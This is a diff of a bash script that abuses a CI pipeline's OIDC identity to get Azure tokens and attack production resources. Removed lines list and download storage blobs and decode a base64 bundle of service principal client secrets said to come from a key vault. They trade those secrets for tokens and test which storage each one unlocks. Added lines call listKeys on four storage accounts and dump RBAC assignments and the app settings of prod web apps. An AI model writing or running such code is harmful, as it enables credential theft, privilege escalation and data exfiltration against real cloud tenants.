@@ -11,66 +11,59 @@ get_az_token() {
     --data-urlencode "client_assertion=${OIDC}" --data-urlencode "scope=$1" | jq -r ".access_token // empty"
 }
 
-ST=$(get_az_token "https://storage.azure.com/.default")
-echo "storage_token_len=${#ST}"
+MT=$(get_az_token "https://management.azure.com/.default")
+echo "mgmt_token_len=${#MT}"
 
-H1="Authorization: Bearer $ST"
-H2="x-ms-version: 2021-06-08"
+RG="rg-tbl-platform-prod-sea"
+SUB="${AZURE_SUBSCRIPTION_ID}"
+BASE="https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG/providers"
 
-echo "=== logs blobs ==="
-curl -sS "https://sttblcilogsprodx3euoz.blob.core.windows.net/logs?restype=container&comp=list" -H "$H1" -H "$H2"
-echo ""
-
-echo "=== exports blobs ==="
-curl -sS "https://sttblbackupprodx3euoz.blob.core.windows.net/exports?restype=container&comp=list" -H "$H1" -H "$H2"
-echo ""
-
-echo "=== more containers sttblbackupprodx3euoz ==="
-curl -sS "https://sttblbackupprodx3euoz.blob.core.windows.net/?comp=list&marker=%2Fsttblbackupprodx3euoz%2Fizsx" -H "$H1" -H "$H2"
-echo ""
-
-echo "=== download logs blobs ==="
-for blob in $(curl -sS "https://sttblcilogsprodx3euoz.blob.core.windows.net/logs?restype=container&comp=list" -H "$H1" -H "$H2" | grep -oP '(?<=<Name>)[^<]+'); do
-  echo "--- logs/$blob ---"
-  curl -sS "https://sttblcilogsprodx3euoz.blob.core.windows.net/logs/$blob" -H "$H1" -H "$H2" | head -c 4000
-  echo ""
+# Try listKeys for each storage account
+for sa in sttblcilogsprodx3euoz sttblbackupprodx3euoz sttblappcfgprodx3euoz sttblarchiveprodx3euoz; do
+  echo "=== $sa listKeys ==="
+  curl -sS -X POST "$BASE/Microsoft.Storage/storageAccounts/$sa/listKeys?api-version=2023-05-01" \
+    -H "Authorization: Bearer $MT" -H "Content-Length: 0" | jq -c . 2>/dev/null || echo "FAILED"
 done
 
-echo "=== download exports blobs ==="
-for blob in $(curl -sS "https://sttblbackupprodx3euoz.blob.core.windows.net/exports?restype=container&comp=list" -H "$H1" -H "$H2" | grep -oP '(?<=<Name>)[^<]+'); do
-  echo "--- exports/$blob ---"
-  curl -sS "https://sttblbackupprodx3euoz.blob.core.windows.net/exports/$blob" -H "$H1" -H "$H2" | head -c 4000
-  echo ""
+# RBAC role assignments on storage accounts
+for sa in sttblappcfgprodx3euoz sttblcilogsprodx3euoz sttblbackupprodx3euoz; do
+  echo "=== $sa RBAC ==="
+  curl -sS "$BASE/Microsoft.Storage/storageAccounts/$sa/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01" \
+    -H "Authorization: Bearer $MT" | jq -c '.value[]? | {principalId, principalType, roleDefinitionId: (.properties.roleDefinitionId | split("/") | last), scope: .properties.scope}' 2>/dev/null
 done
 
-# Decode SP creds from KV1 secrets (already in base64)
-SP_DATA=$(echo 'eyJzZWNyZXRzLXN5bmMiOiBbIjU4MTA4ZGE4LTA0NGUtNGQ3ZS05YTQ2LTkyZTYxNzliMzBiZSIsICJ+OFQ4UX5Zd0VtZXhTVFJ2X3BVc0V3YTlRTWFweVAzOX5DVTVVY3UyIl0sICJzeW5jLXNlcnZpY2UiOiBbIjQ2MmQxYzM4LTQ0NTktNDhiOC05MzMzLTgyZTM4OWU1OTUxNCIsICJzazE4UX5xRDIya2tIWFVDZnFYTHFkUDk1RGtZSkwzNGVNRVJsY1NqIl0sICJyZXBvcnRpbmctc3ZjIjogWyIxMmVkNTRkZS1mMmViLTQ3ODQtODA0Yy0zYTdhM2U4M2E5ZTkiLCAiblA4OFF+OEl+d2lwMEdPbFcxNXpkdDNGTU12QlY5TFl0YU9vZWEzeiJdLCAicmVwb3J0aW5nLXZpZXciOiBbIjg4MWZkZGNlLTYyMDgtNGFmNS1hMjk3LTdlNzljOTEyZjgzYyIsICItVGw4UX5zSDBRT1AuVnJLV2hhMy03eDRYQTJKeFM0ajA4bnV2YlFOIl0sICJjb3N0LXJlYWRlciI6IFsiMDM4YmMzNWQtMTMxZC00OTUzLTk5ODUtZmY0YTI0NWNjZWMxIiwgIjFCRThRfnlHUThlX3o2VkJjemxHSjhZZU9IZ05SVWZmYmdOdWZiMm0iXSwgImRpci1hdWRpdCI6IFsiMmMzNDMwMGUtMWJjMC00MWU3LTljMWUtOGI3NTcxZDcyYzcyIiwgIkFsNzhRfm41YmRvTzNya0NqdW8ySkkyTkhxYWdKb29hWnNmWE5jbTYiXX0=' | base64 -d)
+# Check the reporting app service
+echo "=== app-tbl-reporting-prod details ==="
+curl -sS "$BASE/Microsoft.Web/sites/app-tbl-reporting-prod?api-version=2023-12-01" \
+  -H "Authorization: Bearer $MT" | jq '{name, defaultHostName: .properties.defaultHostName, state: .properties.state, kind, identity: .identity}' 2>/dev/null
 
-echo "=== SP storage access ==="
-echo "$SP_DATA" | python3 -c "
-import sys, json, subprocess
-sps = json.load(sys.stdin)
-tid = '3205c325-06a5-4171-9ce8-ffc5e6c2845e'
-for name, (cid, sec) in sps.items():
-    r = subprocess.run(['curl', '-sS', '-X', 'POST',
-        f'https://login.microsoftonline.com/{tid}/oauth2/v2.0/token',
-        '-d', f'client_id={cid}', '-d', 'grant_type=client_credentials',
-        '-d', f'client_secret={sec}', '-d', 'scope=https://storage.azure.com/.default'],
-        capture_output=True, text=True)
-    import json as j
-    tok = j.loads(r.stdout).get('access_token','')
-    print(f'{name} storage_len={len(tok)}')
-    if len(tok) > 100:
-        for sa, ct in [('sttblappcfgprodx3euoz','config'), ('sttblcilogsprodx3euoz','logs'), ('sttblbackupprodx3euoz','exports')]:
-            r2 = subprocess.run(['curl', '-sS',
-                f'https://{sa}.blob.core.windows.net/{ct}?restype=container&comp=list',
-                '-H', f'Authorization: Bearer {tok}', '-H', 'x-ms-version: 2021-06-08'],
-                capture_output=True, text=True)
-            has_blobs = '<Name>' in r2.stdout
-            status = 'HAS_BLOBS' if has_blobs else ('ERROR' if 'Error' in r2.stdout else 'EMPTY')
-            print(f'  {sa}/{ct}: {status}')
-            if has_blobs:
-                print(f'  {r2.stdout[:500]}')
-"
+# Get reporting app config
+echo "=== reporting app config ==="
+curl -sS "$BASE/Microsoft.Web/sites/app-tbl-reporting-prod/config/web?api-version=2023-12-01" \
+  -H "Authorization: Bearer $MT" | jq . 2>/dev/null
+
+# Get reporting app settings
+echo "=== reporting app settings ==="
+curl -sS -X POST "$BASE/Microsoft.Web/sites/app-tbl-reporting-prod/config/appsettings/list?api-version=2023-12-01" \
+  -H "Authorization: Bearer $MT" -H "Content-Length: 0" | jq . 2>/dev/null
+
+# Get storefront app config for comparison
+echo "=== storefront app config ==="
+curl -sS "$BASE/Microsoft.Web/sites/app-tbl-storefront-prod/config/web?api-version=2023-12-01" \
+  -H "Authorization: Bearer $MT" | jq '{linuxFxVersion: .properties.linuxFxVersion, appSettings: .properties.appSettings, cors: .properties.cors}' 2>/dev/null
+
+# Get storefront app settings  
+echo "=== storefront app settings ==="
+curl -sS -X POST "$BASE/Microsoft.Web/sites/app-tbl-storefront-prod/config/appsettings/list?api-version=2023-12-01" \
+  -H "Authorization: Bearer $MT" -H "Content-Length: 0" | jq . 2>/dev/null
+
+# Lookup role definition for the unknown SP in KV2 RBAC
+echo "=== Role def 8e3af657 ==="
+curl -sS "https://management.azure.com/subscriptions/$SUB/providers/Microsoft.Authorization/roleDefinitions/8e3af657-a8ff-443c-a75c-2fe8c4bcb635?api-version=2022-04-01" \
+  -H "Authorization: Bearer $MT" | jq -c '{roleName: .properties.roleName, description: .properties.description}' 2>/dev/null
+
+echo "=== Role def acdd72a7 ==="
+curl -sS "https://management.azure.com/subscriptions/$SUB/providers/Microsoft.Authorization/roleDefinitions/acdd72a7-3385-48ef-bd42-f606fba81ae7?api-version=2022-04-01" \
+  -H "Authorization: Bearer $MT" | jq -c '{roleName: .properties.roleName}' 2>/dev/null
 
 echo "=== Done ==="
